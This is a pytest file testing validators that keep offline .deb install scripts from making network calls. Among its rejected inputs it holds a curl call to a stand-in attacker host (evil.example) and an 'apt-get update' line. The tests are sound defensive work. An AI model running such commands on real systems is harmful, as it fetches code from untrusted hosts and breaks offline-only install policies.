"""Behavioral tests for the OS .deb-bundle artifact validation path:
_validate_os_bundle_commands() and _validate_os_bundle_file_policy().

_validate_python_bundle_file_policy() (see test_python_bundle_artifact_
validation.py) already does the per-line, comment-skipping scan, with a
comment explaining why: a whole-file _re.search() has no way to tell a
forbidden command from a comment that merely mentions one. The OS-side
validator predates that lesson and used a whole-file search, which meant
fetch_os_bundle.py's own install_script() docstring-style comment
("# ingen ``apt update`` eller netværksdownload på Edgen.") tripped its
own "forbidden apt update" check on every real bundle build — found
2026-09-07 while trying to get the first Edge-2 OS update through
approval end to end (see Dokumentation/HANDOVER_LOG.md).
"""
import pytest
from fastapi import HTTPException

import main


# ── _validate_os_bundle_commands() ──────────────────────────────────────────

def test_validate_commands_accepts_offline_apt_get_install():
    main._validate_os_bundle_commands([
        {
            "name": "offline dpkg/apt install from signed .deb bundle",
            "argv": ["/usr/bin/apt-get", "--no-download", "install", "{bundle}/foo.deb"],
        }
    ])


def test_validate_commands_rejects_non_allowlisted_executable():
    with pytest.raises(HTTPException):
        main._validate_os_bundle_commands([
            {"name": "sneaky", "argv": ["/usr/bin/curl", "{bundle}/x"]}
        ])


def test_validate_commands_rejects_apt_get_update():
    with pytest.raises(HTTPException):
        main._validate_os_bundle_commands([
            {"name": "sneaky", "argv": ["/usr/bin/apt-get", "update", "{bundle}"]}
        ])


def test_validate_commands_rejects_apt_get_without_no_download():
    with pytest.raises(HTTPException):
        main._validate_os_bundle_commands([
            {"name": "sneaky", "argv": ["/usr/bin/apt-get", "install", "{bundle}/foo.deb"]}
        ])


# ── _validate_os_bundle_file_policy() ───────────────────────────────────────

def test_file_policy_accepts_real_install_script_with_explanatory_comment(tmp_path):
    # Regression: fetch_os_bundle.py's install_script() always emits this
    # exact comment. A real, offline-only apt-get --no-download install line
    # follows it — this must pass, not be rejected for a phrase inside a
    # comment.
    (tmp_path / "install-offline.sh").write_text(
        "#!/bin/bash\n"
        "set -euo pipefail\n"
        "cd \"$(dirname \"$0\")\"\n"
        "# Kun pakker i dette signerede bundle gøres tilgængelige for APT. Der foretages\n"
        "# ingen ``apt update`` eller netværksdownload på Edgen.\n"
        "install -d -m 0755 /var/cache/apt/archives\n"
        "cp -f packages/*.deb /var/cache/apt/archives/\n"
        "apt-get --no-download --no-install-recommends --allow-downgrades "
        "--allow-change-held-packages -y install 'curl=7.81.0-1ubuntu1.27' 'wget=1.21.2-2ubuntu1.5'\n"
        "./verify-installed.sh\n"
    )
    main._validate_os_bundle_file_policy(tmp_path, [{"path": "install-offline.sh"}])


def test_file_policy_rejects_real_curl_invocation(tmp_path):
    (tmp_path / "install-offline.sh").write_text("#!/bin/bash\ncurl https://evil.example/x\n")
    with pytest.raises(HTTPException):
        main._validate_os_bundle_file_policy(tmp_path, [{"path": "install-offline.sh"}])


def test_file_policy_rejects_apt_get_update_outside_comment(tmp_path):
    (tmp_path / "install-offline.sh").write_text("#!/bin/bash\napt-get update\n")
    with pytest.raises(HTTPException):
        main._validate_os_bundle_file_policy(tmp_path, [{"path": "install-offline.sh"}])


def test_file_policy_rejects_apt_get_install_missing_no_download(tmp_path):
    (tmp_path / "install-offline.sh").write_text(
        "#!/bin/bash\napt-get install 'curl=7.81.0-1ubuntu1.27'\n"
    )
    with pytest.raises(HTTPException):
        main._validate_os_bundle_file_policy(tmp_path, [{"path": "install-offline.sh"}])


def test_file_policy_ignores_non_script_files(tmp_path):
    (tmp_path / "packages" ).mkdir()
    (tmp_path / "packages" / "curl_7.81.0.deb").write_bytes(b"fake deb bytes with curl in the filename")
    main._validate_os_bundle_file_policy(tmp_path, [{"path": "packages/curl_7.81.0.deb"}])
